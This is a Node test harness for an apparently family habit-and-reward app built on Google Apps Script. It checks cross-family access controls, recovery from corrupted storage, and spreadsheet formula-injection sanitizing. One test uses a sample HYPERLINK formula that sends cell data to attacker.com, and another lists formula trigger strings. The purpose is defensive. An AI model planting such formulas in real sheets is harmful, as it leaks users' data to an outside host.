/**
 * =========================================================================
 * ZOPTRO - EMPIRICAL CHALLENGER STRESS HARNESS
 * =========================================================================
 * Scope:
 * 1. Deep Cross-Family Pairing Boundaries & Multi-Tenant Isolation
 * 2. Extreme Storage Corruption & Self-Healing Resilience (Mock + GAS)
 * 3. Formula Injection (CWE-1236) Sanitization Verification
 * =========================================================================
 */

const assert = require('assert');
const path = require('path');
const fs = require('fs');
const vm = require('vm');

console.log("=================================================================");
console.log("🔥 EMPIRICAL CHALLENGER DEEP STRESS HARNESS");
console.log("=================================================================\n");

let stats = {
  total: 0,
  passed: 0,
  failed: 0,
  failures: []
};

function test(name, fn) {
  stats.total++;
  try {
    fn();
    stats.passed++;
    console.log(`  🛡️  [STRESS-PASS]: ${name}`);
  } catch (err) {
    stats.failed++;
    stats.failures.push({ name, error: err.message, stack: err.stack });
    console.error(`  🚨 [STRESS-FAIL]: ${name}`);
    console.error(`     Error: ${err.message}`);
  }
}

async function testAsync(name, fn) {
  stats.total++;
  try {
    await fn();
    stats.passed++;
    console.log(`  🛡️  [STRESS-PASS]: ${name}`);
  } catch (err) {
    stats.failed++;
    stats.failures.push({ name, error: err.message, stack: err.stack });
    console.error(`  🚨 [STRESS-FAIL]: ${name}`);
    console.error(`     Error: ${err.message}`);
  }
}

// -------------------------------------------------------------------------
// 1. Setup Mock GAS Environment
// -------------------------------------------------------------------------
class MockRange {
  constructor(sheet, startRow, startCol, numRows, numCols) {
    this.sheet = sheet;
    this.startRow = startRow;
    this.startCol = startCol;
    this.numRows = numRows;
    this.numCols = numCols;
  }
  setBackground() { return this; }
  setFontColor() { return this; }
  setFontWeight() { return this; }
  setHorizontalAlignment() { return this; }
  setBorder() { return this; }
  setValue(val) {
    this.sheet._ensureSize(this.startRow, this.startCol);
    this.sheet.grid[this.startRow - 1][this.startCol - 1] = val;
    return this;
  }
  setValues(matrix) {
    for (let r = 0; r < matrix.length; r++) {
      for (let c = 0; c < matrix[r].length; c++) {
        const row = this.startRow + r;
        const col = this.startCol + c;
        this.sheet._ensureSize(row, col);
        this.sheet.grid[row - 1][col - 1] = matrix[r][c];
      }
    }
    return this;
  }
  getValues() {
    const result = [];
    for (let r = 0; r < this.numRows; r++) {
      const row = [];
      for (let c = 0; c < this.numCols; c++) {
        const rowIdx = this.startRow - 1 + r;
        const colIdx = this.startCol - 1 + c;
        const val = (this.sheet.grid[rowIdx] && this.sheet.grid[rowIdx][colIdx] !== undefined)
          ? this.sheet.grid[rowIdx][colIdx] : "";
        row.push(val);
      }
      result.push(row);
    }
    return result;
  }
}

class MockSheet {
  constructor(name) {
    this.name = name;
    this.grid = [];
    this.frozenRows = 0;
  }
  _ensureSize(r, c) {
    while (this.grid.length < r) this.grid.push([]);
    for (let i = 0; i < this.grid.length; i++) {
      while (this.grid[i].length < c) this.grid[i].push("");
    }
  }
  getName() { return this.name; }
  setName(n) { this.name = n; }
  getLastRow() { return this.grid.length; }
  getLastColumn() {
    let max = 0;
    this.grid.forEach(row => { if (row.length > max) max = row.length; });
    return max;
  }
  appendRow(rowArr) { this.grid.push([...rowArr]); }
  insertRowsBefore(beforeRow, count) {
    for (let i = 0; i < count; i++) this.grid.splice(beforeRow - 1, 0, []);
  }
  deleteRow(rowNumber) { this.grid.splice(rowNumber - 1, 1); }
  setFrozenRows(n) { this.frozenRows = n; }
  getRange(startRow, startCol, numRows = 1, numCols = 1) {
    return new MockRange(this, startRow, startCol, numRows, numCols);
  }
  getDataRange() {
    const numRows = Math.max(1, this.grid.length);
    let numCols = 1;
    this.grid.forEach(r => { if (r.length > numCols) numCols = r.length; });
    return new MockRange(this, 1, 1, numRows, numCols);
  }
}

class MockSpreadsheet {
  constructor() { this.sheets = []; }
  getSheetByName(name) { return this.sheets.find(s => s.name === name) || null; }
  insertSheet(name) {
    const s = new MockSheet(name);
    this.sheets.push(s);
    return s;
  }
  deleteSheet(sheet) {
    const idx = this.sheets.indexOf(sheet);
    if (idx !== -1) this.sheets.splice(idx, 1);
  }
}

let mockSpreadsheet = new MockSpreadsheet();

global.SpreadsheetApp = {
  getActiveSpreadsheet: () => mockSpreadsheet,
  BorderStyle: { SOLID: 'SOLID' }
};

global.LockService = {
  getScriptLock: () => ({
    waitLock: () => true,
    releaseLock: () => true
  })
};

global.HtmlService = {
  XFrameOptionsMode: { ALLOWALL: 'ALLOWALL' },
  createHtmlOutputFromFile: (name) => ({
    name,
    setTitle: function() { return this; },
    addMetaTag: function() { return this; },
    setXFrameOptionsMode: function() { return this; }
  }),
  createHtmlOutput: (html) => ({ html })
};

global.Session = {
  getActiveUser: () => ({ getEmail: () => 'parent@zoptro.local' }),
  getScriptTimeZone: () => 'GMT+5:30'
};

global.MailApp = {
  sendEmail: () => true
};

// Load GAS backend
const gasBackend = require('../google_apps_script_backend.js');

// Load BrowserMockBackend
const htmlFilePath = path.join(__dirname, '../divyank_mission_control_google_apps_script_app.html');
const htmlSource = fs.readFileSync(htmlFilePath, 'utf8');
const scriptMatches = htmlSource.match(/<script[\s\S]*?>([\s\S]*?)<\/script>/gi);
const lastScriptTag = scriptMatches[scriptMatches.length - 1];
const appScript = lastScriptTag.replace(/<\/?script[\s\S]*?>/gi, "");

class InMemStorage {
  constructor() { this.map = new Map(); }
  getItem(k) { return this.map.has(String(k)) ? this.map.get(String(k)) : null; }
  setItem(k, v) { this.map.set(String(k), String(v)); }
  removeItem(k) { this.map.delete(String(k)); }
  clear() { this.map.clear(); }
}

function createBrowserMockEnv(preExistingStore = null) {
  const memStore = preExistingStore || new InMemStorage();
  const mockExports = {};
  const mockElement = {
    getContext: () => ({
      clearRect: () => {}, save: () => {}, restore: () => {},
      translate: () => {}, rotate: () => {}, fillRect: () => {}
    }),
    classList: { add: () => {}, remove: () => {}, toggle: () => {} },
    addEventListener: () => {},
    style: {},
    innerText: '',
    value: '',
    innerHTML: '',
    appendChild: () => {},
    insertBefore: () => {},
    remove: () => {}
  };

  const mockWindow = {
    addEventListener: () => {},
    innerWidth: 1024,
    innerHeight: 768,
    AudioContext: function() {
      return {
        currentTime: 0, destination: {},
        createOscillator: () => ({ connect: () => {}, start: () => {}, stop: () => {}, frequency: { setValueAtTime: () => {} }, type: '' }),
        createGain: () => ({ connect: () => {}, gain: { setValueAtTime: () => {}, exponentialRampToValueAtTime: () => {} } })
      };
    },
    localStorage: {
      getItem: (k) => memStore.getItem(k),
      setItem: (k, v) => memStore.setItem(k, v),
      removeItem: (k) => memStore.removeItem(k)
    }
  };

  const mockContext = {
    module: { exports: mockExports },
    exports: mockExports,
    console: console,
    Date: Date,
    Math: Math,
    setTimeout: (fn) => { if (typeof fn === 'function') fn(); return 1; },
    clearTimeout: () => {},
    setInterval: () => 1,
    clearInterval: () => {},
    requestAnimationFrame: () => 1,
    window: mockWindow,
    document: {
      getElementById: () => mockElement,
      querySelectorAll: () => [],
      createElement: () => mockElement,
      body: mockElement,
      addEventListener: () => {}
    },
    tailwind: { config: {} }
  };
  mockWindow.window = mockWindow;
  mockWindow.document = mockContext.document;

  vm.createContext(mockContext);
  vm.runInContext(appScript, mockContext);

  const mock = mockContext.window.BrowserMockBackend || mockContext.module.exports.BrowserMockBackend;
  const client = mockContext.window.ZoptroApiClient || mockContext.module.exports.ZoptroApiClient;
  mock.init(false);
  return { mock, client, store: memStore };
}

async function runEmpiricalStress() {
  console.log("\n--- PART 1: CROSS-FAMILY PAIRING BOUNDARIES (GAS BACKEND) ---");

  // Reset GAS DB
  mockSpreadsheet = new MockSpreadsheet();
  gasBackend.initializeDatabase();

  // Create Family 1: Parent 1 + Student 1A + Student 1B
  const p1Res = gasBackend.signUpParent({
    fullName: "Parent One",
    email: "parent1@family.test",
    pin: "1111",
    password: "Password111"
  });
  assert(p1Res.success, "Parent 1 signup should succeed");
  const p1Id = p1Res.user.id;
  const p1Code = p1Res.pairingCode;

  const s1aRes = gasBackend.signUpStudent({
    fullName: "Student 1A",
    pin: "1111",
    pairingCode: p1Code
  });
  assert(s1aRes.success, "Student 1A signup should succeed");
  const s1aId = s1aRes.user.id;

  const s1bRes = gasBackend.signUpStudent({
    fullName: "Student 1B",
    pin: "1111",
    pairingCode: p1Code
  });
  assert(s1bRes.success, "Student 1B signup should succeed");
  const s1bId = s1bRes.user.id;

  // Create Family 2: Parent 2 + Student 2A
  const p2Res = gasBackend.signUpParent({
    fullName: "Parent Two",
    email: "parent2@family.test",
    pin: "2222",
    password: "Password222"
  });
  assert(p2Res.success, "Parent 2 signup should succeed");
  const p2Id = p2Res.user.id;
  const p2Code = p2Res.pairingCode;

  const s2aRes = gasBackend.signUpStudent({
    fullName: "Student 2A",
    pin: "2222",
    pairingCode: p2Code
  });
  assert(s2aRes.success, "Student 2A signup should succeed");
  const s2aId = s2aRes.user.id;

  // Parent 1 creates Habit & Reward for Family 1
  const h1Res = gasBackend.saveHabit({
    parentUserId: p1Id,
    habitData: { title: "Family 1 Math Practice", points: 20, xp: 40 }
  });
  assert(h1Res.success);
  const questId1 = h1Res.habit.id;

  const rw1Res = gasBackend.manageRewardItem({
    parentUserId: p1Id,
    rewardData: { title: "Family 1 Ice Cream", costCoins: 50, icon: "🍦" }
  });
  assert(rw1Res.success);
  const rewardId1 = rw1Res.reward.id;

  // Parent 2 creates Habit & Reward for Family 2
  const h2Res = gasBackend.saveHabit({
    parentUserId: p2Id,
    habitData: { title: "Family 2 Piano Practice", points: 25, xp: 50 }
  });
  assert(h2Res.success);
  const questId2 = h2Res.habit.id;

  // Have Student 1A submit Family 1 quest
  const sub1a = gasBackend.submitQuestCompletion({
    studentId: s1aId,
    questId: questId1,
    notes: "Student 1A completed habit"
  });
  assert(sub1a.success, "Quest submission 1A should succeed");

  // Give Student 1A coins via valid Parent 1 bonus and submit redemption for Family 1 reward
  gasBackend.awardParentBonus({ parentUserId: p1Id, studentId: s1aId, coins: 100, reason: "Allowance" });
  const rdm1a = gasBackend.submitRedemptionRequest({
    studentId: s1aId,
    rewardId: rewardId1
  });
  assert(rdm1a.success, "Redemption 1A should succeed");

  // Have Student 2A submit Family 2 quest
  const sub2a = gasBackend.submitQuestCompletion({
    studentId: s2aId,
    questId: questId2,
    notes: "Student 2A completed habit"
  });
  assert(sub2a.success, "Quest submission 2A should succeed");

  // 1. Cross-Family Security Update
  test("XF-GAS-01: Parent 2 cannot alter PIN/Password of Student 1A (unpaired family)", () => {
    const res = gasBackend.updateStudentSecurity({
      parentUserId: p2Id,
      studentId: s1aId,
      newPin: "9999"
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"), `Expected UNAUTHORIZED, got: ${res.error}`);
  });

  // 2. Cross-Family Quest Approval
  test("XF-GAS-02: Parent 2 cannot approve quest submission of Student 1A", () => {
    const res = gasBackend.approveQuestSubmission({
      submissionId: sub1a.submissionId,
      parentUserId: p2Id,
      bonusCoins: 50
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"), `Expected UNAUTHORIZED, got: ${res.error}`);
  });

  // 3. Cross-Family Quest Rejection
  test("XF-GAS-03: Parent 2 cannot reject quest submission of Student 1A", () => {
    const res = gasBackend.rejectQuestSubmission({
      submissionId: sub1a.submissionId,
      parentUserId: p2Id,
      reason: "Malicious rejection"
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"), `Expected UNAUTHORIZED, got: ${res.error}`);
  });

  // 4. Cross-Family Reward Approval
  test("XF-GAS-04: Parent 2 cannot approve reward redemption of Student 1A", () => {
    const res = gasBackend.approveRedemption({
      redemptionId: rdm1a.redemptionId,
      parentUserId: p2Id
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"), `Expected UNAUTHORIZED, got: ${res.error}`);
  });

  // 5. Cross-Family Reward Rejection
  test("XF-GAS-05: Parent 2 cannot reject reward redemption of Student 1A", () => {
    const res = gasBackend.rejectRedemption({
      redemptionId: rdm1a.redemptionId,
      parentUserId: p2Id,
      reason: "Malicious rejection"
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"), `Expected UNAUTHORIZED, got: ${res.error}`);
  });

  // 6. Cross-Family Parent Bonus Award
  test("XF-GAS-06: Parent 2 cannot award bonus coins to Student 1A", () => {
    const res = gasBackend.awardParentBonus({
      parentUserId: p2Id,
      studentId: s1aId,
      coins: 50
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"), `Expected UNAUTHORIZED, got: ${res.error}`);
  });

  // 7. Multi-Tenant Queue Isolation
  test("XF-GAS-07: Parent 1 getPendingVerifications returns only Family 1 submissions (no Family 2 leaks)", () => {
    const p1Queue = gasBackend.getPendingVerifications({ parentUserId: p1Id });
    assert(p1Queue.success);
    const questStudents = p1Queue.pendingQuests.map(q => q.studentId);
    assert(questStudents.includes(s1aId), "Should contain Student 1A submission");
    assert(!questStudents.includes(s2aId), "Must NOT contain Student 2A submission");
  });

  test("XF-GAS-08: Parent 2 getPendingVerifications returns only Family 2 submissions (no Family 1 leaks)", () => {
    const p2Queue = gasBackend.getPendingVerifications({ parentUserId: p2Id });
    assert(p2Queue.success);
    const questStudents = p2Queue.pendingQuests.map(q => q.studentId);
    assert(questStudents.includes(s2aId), "Should contain Student 2A submission");
    assert(!questStudents.includes(s1aId), "Must NOT contain Student 1A submission");
    assert(!questStudents.includes(s1bId), "Must NOT contain Student 1B submission");
  });

  // 8. Legitimate Parent 1 Can Approve Student 1A
  test("XF-GAS-09: Legitimate Parent 1 successfully approves Student 1A submission", () => {
    const res = gasBackend.approveQuestSubmission({
      submissionId: sub1a.submissionId,
      parentUserId: p1Id,
      bonusCoins: 10
    });
    assert(res.success, `Expected success, got: ${JSON.stringify(res)}`);
    assert(res.updatedWallet.coins > 0, "Wallet coins should be incremented");
  });

  // 9. Legitimate Parent 1 Can Approve Student 1A Redemption
  test("XF-GAS-10: Legitimate Parent 1 successfully approves Student 1A redemption", () => {
    const res = gasBackend.approveRedemption({
      redemptionId: rdm1a.redemptionId,
      parentUserId: p1Id
    });
    assert(res.success, `Expected success, got: ${JSON.stringify(res)}`);
  });

  console.log("\n--- PART 2: CROSS-FAMILY PAIRING BOUNDARIES (BROWSER MOCK BACKEND) ---");

  const { mock: mockBackend } = createBrowserMockEnv();
  mockBackend.resetDatabase();

  // Create Family 1 & Family 2 in BrowserMockBackend
  const mP1Res = mockBackend.signUpParent({
    fullName: "Mock Parent 1",
    email: "mockp1@test.local",
    pin: "1111",
    password: "Password111"
  });
  assert(mP1Res.success);
  const mP1Id = mP1Res.user.id;
  const mP1Code = mP1Res.pairingCode;

  const mS1Res = mockBackend.signUpStudent({
    fullName: "Mock Student 1",
    pin: "1111",
    pairingCode: mP1Code
  });
  assert(mS1Res.success);
  const mS1Id = mS1Res.user.id;

  const mP2Res = mockBackend.signUpParent({
    fullName: "Mock Parent 2",
    email: "mockp2@test.local",
    pin: "2222",
    password: "Password222"
  });
  assert(mP2Res.success);
  const mP2Id = mP2Res.user.id;
  const mP2Code = mP2Res.pairingCode;

  const mS2Res = mockBackend.signUpStudent({
    fullName: "Mock Student 2",
    pin: "2222",
    pairingCode: mP2Code
  });
  assert(mS2Res.success);
  const mS2Id = mS2Res.user.id;

  // Parent 1 creates Habit & Reward
  const mH1 = mockBackend.saveHabit({
    parentUserId: mP1Id,
    habitData: { title: "Mock Math Habit", points: 20 }
  });
  assert(mH1.success);
  const mRw1 = mockBackend.manageRewardItem({
    parentUserId: mP1Id,
    rewardData: { title: "Mock Game Time", costCoins: 40 }
  });
  assert(mRw1.success);

  // Have Mock Student 1 submit quest & redemption
  const mSub1 = mockBackend.submitQuestCompletion({
    studentId: mS1Id,
    questId: mH1.habit.id,
    notes: "Mock Student 1 submit"
  });
  assert(mSub1.success);

  mockBackend.awardParentBonus({ parentUserId: mP1Id, studentId: mS1Id, coins: 150, reason: "Seed coins" });
  const mRdm1 = mockBackend.submitRedemptionRequest({
    studentId: mS1Id,
    rewardId: mRw1.reward.id
  });
  assert(mRdm1.success);

  // Parent 2 creates Habit & Student 2 submits
  const mH2 = mockBackend.saveHabit({
    parentUserId: mP2Id,
    habitData: { title: "Mock Reading Habit", points: 15 }
  });
  assert(mH2.success);
  const mSub2 = mockBackend.submitQuestCompletion({
    studentId: mS2Id,
    questId: mH2.habit.id,
    notes: "Mock Student 2 submit"
  });
  assert(mSub2.success);

  test("XF-MOCK-01: BrowserMockBackend blocks Parent 2 from updateStudentSecurity on Student 1", () => {
    const res = mockBackend.updateStudentSecurity({
      parentUserId: mP2Id,
      studentId: mS1Id,
      newPin: "9999"
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"));
  });

  test("XF-MOCK-02: BrowserMockBackend blocks Parent 2 from approving quest of Student 1", () => {
    const res = mockBackend.approveQuestSubmission({
      submissionId: mSub1.submissionId,
      parentUserId: mP2Id,
      bonusCoins: 10
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"));
  });

  test("XF-MOCK-03: BrowserMockBackend blocks Parent 2 from rejecting quest of Student 1", () => {
    const res = mockBackend.rejectQuestSubmission({
      submissionId: mSub1.submissionId,
      parentUserId: mP2Id,
      reason: "Hacker reject"
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"));
  });

  test("XF-MOCK-04: BrowserMockBackend blocks Parent 2 from approving redemption of Student 1", () => {
    const res = mockBackend.approveRedemption({
      redemptionId: mRdm1.redemptionId,
      parentUserId: mP2Id
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"));
  });

  test("XF-MOCK-05: BrowserMockBackend blocks Parent 2 from rejecting redemption of Student 1", () => {
    const res = mockBackend.rejectRedemption({
      redemptionId: mRdm1.redemptionId,
      parentUserId: mP2Id,
      reason: "Hacker reject"
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"));
  });

  test("XF-MOCK-06: BrowserMockBackend blocks Parent 2 from awarding bonus to Student 1", () => {
    const res = mockBackend.awardParentBonus({
      parentUserId: mP2Id,
      studentId: mS1Id,
      coins: 50
    });
    assert.strictEqual(res.success, false);
    assert(res.error.includes("UNAUTHORIZED"));
  });

  test("XF-MOCK-07: BrowserMockBackend isolates verification queues between Parent 1 and Parent 2", () => {
    const q1 = mockBackend.getPendingVerifications({ parentUserId: mP1Id });
    const q2 = mockBackend.getPendingVerifications({ parentUserId: mP2Id });
    assert(q1.success && q2.success);
    const q1Students = q1.pendingQuests.map(q => q.studentId);
    const q2Students = q2.pendingQuests.map(q => q.studentId);
    assert(q1Students.includes(mS1Id));
    assert(!q1Students.includes(mS2Id));
    assert(!q2Students.includes(mS1Id));
  });

  test("XF-MOCK-08: Legitimate Parent 1 approves Student 1 quest in BrowserMockBackend", () => {
    const res = mockBackend.approveQuestSubmission({
      submissionId: mSub1.submissionId,
      parentUserId: mP1Id,
      bonusCoins: 5
    });
    assert(res.success);
    assert(res.updatedWallet.coins > 0);
  });

  console.log("\n--- PART 3: STORAGE CORRUPTION & SELF-HEALING STRESS (MOCK) ---");

  test("SH-MOCK-01: Malformed JSON syntax in Users table triggers clean self-healing", () => {
    const store = new InMemStorage();
    store.setItem("zoptro_users_v2", "{corrupted_json_syntax: [missing_brace");
    const { mock } = createBrowserMockEnv(store);
    mock.init();
    const users = mock._getTable(mock.KEYS.USERS);
    assert(Array.isArray(users), "Users must be an array");
    assert(users.length >= 2, "Users must have at least 2 demo accounts");
    const parent = users.find(u => u.role === "parent");
    const student = users.find(u => u.role === "student");
    assert(parent && student, "Both parent and student seed accounts must exist");
  });

  test("SH-MOCK-02: Non-array JSON primitive (number 42) in Users table triggers clean self-healing", () => {
    const store = new InMemStorage();
    store.setItem("zoptro_users_v2", "42");
    const { mock } = createBrowserMockEnv(store);
    const users = mock._getTable(mock.KEYS.USERS);
    assert(Array.isArray(users), "Users must be healed to an array");
    assert(users.length >= 2, "Users must be restored to >= 2 seed users");
  });

  test("SH-MOCK-03: Empty users array triggers clean self-healing to seed accounts", () => {
    const store = new InMemStorage();
    store.setItem("zoptro_users_v2", "[]");
    const { mock } = createBrowserMockEnv(store);
    const users = mock._getTable(mock.KEYS.USERS);
    assert(users.length >= 2, "Empty users table must self-heal to seed data");
  });

  test("SH-MOCK-04: Single orphan user array (< 2 users) triggers clean self-healing", () => {
    const store = new InMemStorage();
    store.setItem("zoptro_users_v2", JSON.stringify([{ id: "orphan", role: "guest" }]));
    const { mock } = createBrowserMockEnv(store);
    const users = mock._getTable(mock.KEYS.USERS);
    assert(users.length >= 2, "Sub-threshold users array must self-heal to seed data");
  });

  test("SH-MOCK-05: Corrupted SubmissionsQueue JSON self-heals to empty array without crashing", () => {
    const store = new InMemStorage();
    store.setItem("zoptro_submissions_v2", "INVALID_JSON_QUEUE");
    const { mock } = createBrowserMockEnv(store);
    const subs = mock._getTable(mock.KEYS.SUBMISSIONS);
    assert(Array.isArray(subs), "Submissions must be an array");
    assert.strictEqual(subs.length, 0, "Corrupted queue should reset to empty array");
  });

  test("SH-MOCK-06: Corrupted RedemptionsQueue JSON self-heals to empty array without crashing", () => {
    const store = new InMemStorage();
    store.setItem("zoptro_redemptions_v2", "INVALID_JSON_REDEMPTIONS");
    const { mock } = createBrowserMockEnv(store);
    const rdms = mock._getTable(mock.KEYS.REDEMPTIONS);
    assert(Array.isArray(rdms), "Redemptions must be an array");
    assert.strictEqual(rdms.length, 0, "Corrupted queue should reset to empty array");
  });

  test("SH-MOCK-07: Corrupted ActivityLogs JSON self-heals to empty array without crashing", () => {
    const { mock, store } = createBrowserMockEnv();
    mock.resetDatabase();
    // Corrupt logs table specifically
    store.setItem(mock.KEYS.LOGS, "TRUNCATED_LOGS{");
    const logs = mock._getTable(mock.KEYS.LOGS);
    assert(Array.isArray(logs), "Logs must be an array");
    assert.strictEqual(logs.length, 0, "Corrupted logs should reset to empty array");
  });

  test("SH-MOCK-08: Corrupted HabitsQuests triggers catalog re-population on init()", () => {
    const store = new InMemStorage();
    store.setItem("zoptro_habits_v2", "MALFORMED_HABITS");
    const { mock } = createBrowserMockEnv(store);
    mock.init();
    const habits = mock._getTable(mock.KEYS.HABITS);
    assert(Array.isArray(habits) && habits.length > 0, "Habits catalog must be re-populated");
  });

  test("SH-MOCK-09: Complete multi-key simultaneous storage corruption heals completely", () => {
    const store = new InMemStorage();
    store.setItem("zoptro_users_v2", "CORRUPTED");
    store.setItem("zoptro_habits_v2", "CORRUPTED");
    store.setItem("zoptro_submissions_v2", "CORRUPTED");
    store.setItem("zoptro_rewards_v2", "CORRUPTED");
    store.setItem("zoptro_redemptions_v2", "CORRUPTED");
    store.setItem("zoptro_logs_v2", "CORRUPTED");
    const { mock } = createBrowserMockEnv(store);
    mock.init();
    assert(mock._getTable(mock.KEYS.USERS).length >= 2, "Users healed");
    assert(mock._getTable(mock.KEYS.HABITS).length > 0, "Habits healed");
    assert(mock._getTable(mock.KEYS.REWARDS).length > 0, "Rewards healed");
    assert(Array.isArray(mock._getTable(mock.KEYS.SUBMISSIONS)), "Submissions healed");
    assert(Array.isArray(mock._getTable(mock.KEYS.REDEMPTIONS)), "Redemptions healed");
    assert(Array.isArray(mock._getTable(mock.KEYS.LOGS)), "Logs healed");
  });

  console.log("\n--- PART 4: SPREADSHEET SELF-HEALING & FORMULA INJECTION (GAS) ---");

  test("SH-GAS-01: Missing sheets are recreated with correct schema headers", () => {
    mockSpreadsheet = new MockSpreadsheet();
    gasBackend.initializeDatabase();
    // Intentionally delete SubmissionsQueue and RewardsCatalog
    const subSheet = mockSpreadsheet.getSheetByName("SubmissionsQueue");
    const rdmSheet = mockSpreadsheet.getSheetByName("RewardsCatalog");
    mockSpreadsheet.deleteSheet(subSheet);
    mockSpreadsheet.deleteSheet(rdmSheet);
    assert.strictEqual(mockSpreadsheet.getSheetByName("SubmissionsQueue"), null);
    assert.strictEqual(mockSpreadsheet.getSheetByName("RewardsCatalog"), null);

    // Run initializeDatabase (self-healing)
    gasBackend.initializeDatabase();

    const restoredSub = mockSpreadsheet.getSheetByName("SubmissionsQueue");
    const restoredRdm = mockSpreadsheet.getSheetByName("RewardsCatalog");
    assert(restoredSub !== null, "SubmissionsQueue should be recreated");
    assert(restoredRdm !== null, "RewardsCatalog should be recreated");

    // Check headers
    const subHeaders = restoredSub.getDataRange().getValues()[0];
    assert.deepStrictEqual(subHeaders, gasBackend.SCHEMAS.SubmissionsQueue);
  });

  test("SH-GAS-02: Corrupted/scrambled header rows are healed without losing underlying data", () => {
    mockSpreadsheet = new MockSpreadsheet();
    gasBackend.initializeDatabase();
    const usersSheet = mockSpreadsheet.getSheetByName("Users");
    // Overwrite header row with garbage
    usersSheet.grid[0] = ["bad_col1", "bad_col2", "bad_col3"];
    // Keep row 2 (data)
    usersSheet.grid[1] = ["u_par_demo", "parent", "Demo Parent"];

    // Run initializeDatabase
    gasBackend.initializeDatabase();

    // Verify row 1 is healed to correct headers
    const headers = usersSheet.getDataRange().getValues()[0];
    assert.deepStrictEqual(headers, gasBackend.SCHEMAS.Users);
  });

  test("SH-GAS-03: Formula Injection (CWE-1236) values are sanitized with prepended single quote", () => {
    // Test direct sanitizeSheetCellValue with spreadsheet formula triggers
    const formulaTriggers = [
      "=SUM(A1:A10)",
      "+12345",
      "-2+5",
      "@SUM(1,2)",
      "\t=CMD",
      "\r+EXEC",
      " =FORMULA"
    ];

    formulaTriggers.forEach(formula => {
      const sanitized = gasBackend.sanitizeSheetCellValue(formula);
      assert.strictEqual(sanitized.charAt(0), "'", `Formula '${formula}' must be prefixed with quote: got '${sanitized}'`);
    });

    // Test benign strings are NOT altered
    const benign = ["Clean Note", "Math Habit", "1234", "Rajesh"];
    benign.forEach(str => {
      assert.strictEqual(gasBackend.sanitizeSheetCellValue(str), str);
    });
  });

  test("SH-GAS-04: Quest submission notes containing spreadsheet formulas are safely sanitized in sheet", () => {
    mockSpreadsheet = new MockSpreadsheet();
    gasBackend.initializeDatabase();

    const maliciousNote = "=HYPERLINK(\"http://attacker.com/leak?data=\"&A1,\"Click Here\")";
    const sub = gasBackend.submitQuestCompletion({
      studentId: "u_stu_demo",
      questId: "h_1",
      notes: maliciousNote
    });
    assert(sub.success, "Quest submission should succeed");

    // Inspect the raw cell value in SubmissionsQueue sheet
    const subSheet = mockSpreadsheet.getSheetByName("SubmissionsQueue");
    const rows = subSheet.getDataRange().getValues();
    const subRow = rows.find(r => r[0] === sub.submissionId);
    assert(subRow, "Submission record should exist in sheet");
    const storedNotes = subRow[gasBackend.SCHEMAS.SubmissionsQueue.indexOf("notes")];
    assert.strictEqual(storedNotes, "'" + maliciousNote, "Stored note must be safely prefixed with single quote");
  });

  console.log("\n=================================================================");
  console.log(`🏁 EMPIRICAL STRESS COMPLETE: ${stats.passed}/${stats.total} PASSED`);
  if (stats.failed > 0) {
    console.error(`🚨 FAILURES DETECTED: ${stats.failed}`);
    process.exit(1);
  } else {
    console.log("🎉 ALL CROSS-FAMILY & SELF-HEALING STRESS DEFENSES VERIFIED 100%!");
    console.log("=================================================================\n");
  }
}

runEmpiricalStress().catch(err => {
  console.error("FATAL HARNESS ERROR:", err);
  process.exit(1);
});
